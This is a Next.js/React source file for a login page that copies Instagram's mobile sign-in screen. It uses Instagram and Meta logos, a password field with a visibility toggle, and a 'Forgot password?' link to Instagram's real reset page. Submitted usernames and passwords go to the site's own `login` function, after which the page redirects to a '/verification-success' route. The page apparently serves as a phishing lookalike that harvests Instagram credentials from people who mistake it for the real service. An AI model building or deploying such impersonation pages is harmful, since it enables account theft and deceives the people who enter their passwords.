'use client';

import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useState } from 'react';
import { login } from '@/lib/auth';
import GuestRoute from '@/components/auth/GuestRoute';
import { useForm } from '@/hooks/useForm';
import { loginValidationRules } from '@/lib/validation';

interface LoginFormData extends Record<string, string> {
  email: string;
  password: string;
}

function LoginForm() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);

  const {
    values,
    errors,
    isSubmitting,
    handleChange,
    handleSubmit,
    setFieldError
  } = useForm<LoginFormData>(
    { email: '', password: '' },
    loginValidationRules
  );

  const onSubmit = async (formData: LoginFormData) => {
    const result = await login(formData.email, formData.password);

    if (result.success) {
      router.push('/verification-success');
    } else {
      setFieldError('email', result.message);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Language Selector */}
      <div className="text-center pt-6 pb-12">
        <span className="text-gray-500 text-base">English (US)</span>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col justify-center px-6">
        {/* Instagram Logo */}
        <div className="text-center mb-12">
          <div className="w-16 h-16 mx-auto mb-8 flex items-center justify-center">
            <img
              src="/images/insta_logo_4.png"
              alt="Instagram"
              className="max-w-full max-h-full object-contain"
            />
          </div>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
          {/* Username/Email/Phone Input */}
          <div>
            <input
              id="email"
              name="email"
              type="text"
              autoComplete="username"
              placeholder="Username, email or mobile number"
              value={values.email}
              onChange={handleChange}
              className="w-full px-4 py-4 bg-gray-50 border border-gray-300 rounded-xl text-base placeholder-gray-500 focus:outline-none focus:border-gray-400 focus:bg-white transition-colors"
            />
            {errors.email && (
              <p className="text-red-500 text-sm mt-2 px-1">{errors.email}</p>
            )}
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              id="password"
              name="password"
              type={showPassword ? "text" : "password"}
              autoComplete="current-password"
              placeholder="Password"
              value={values.password}
              onChange={handleChange}
              className="w-full px-4 py-4 pr-12 bg-gray-50 border border-gray-300 rounded-xl text-base placeholder-gray-500 focus:outline-none focus:border-gray-400 focus:bg-white transition-colors"
            />
            {/* Password visibility toggle */}
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
            >
              {showPassword ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                </svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              )}
            </button>
            {errors.password && (
              <p className="text-red-500 text-sm mt-2 px-1">{errors.password}</p>
            )}
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-blue-500 text-white py-4 rounded-2xl font-semibold text-base disabled:opacity-50 disabled:cursor-not-allowed hover:bg-blue-600 transition-colors mt-6"
          >
            {isSubmitting ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Forgot Password Link - moved outside form and closer to login button */}
        <div className="text-center mt-4">
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            target="_blank"
            rel="noopener noreferrer"
            className="text-gray-600 text-sm"
          >
            Forgot password?
          </a>
        </div>
      </div>

      {/* Bottom Section */}
      <div className="pb-12 px-6">
        {/* Create Account Button */}
        <Link href="/register">
          <button className="w-full border border-blue-500 text-blue-500 py-4 rounded-2xl font-semibold text-base hover:bg-blue-50 transition-colors">
            Create new account
          </button>
        </Link>

        {/* Meta Logo */}
        <div className="text-center mt-12">
          <img
            src="/images/meta_logo_2.png"
            alt="Meta"
            className="h-10 mx-auto opacity-70"
          />
        </div>
      </div>
    </div>
  );
}

export default function LoginPage() {
  return (
    <GuestRoute>
      <LoginForm />
    </GuestRoute>
  );
}
